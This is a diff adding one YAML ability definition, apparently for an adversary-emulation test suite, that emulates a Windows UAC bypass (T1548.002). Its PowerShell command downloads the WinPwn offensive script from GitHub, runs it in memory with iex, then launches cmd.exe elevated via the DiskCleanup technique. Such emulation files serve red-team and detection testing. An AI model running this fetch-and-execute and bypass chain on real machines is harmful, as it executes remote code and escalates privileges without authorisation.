@@ -1,0 +1,13 @@
+- id: 9434b58b-9256-599f-9b42-8a332d003bca
+  name: Soumaia ART Tests - WinPwn - UAC Bypass DiskCleanup technique
+  description: UAC bypass using DiskCleanup technique via function of WinPwn
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+          UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
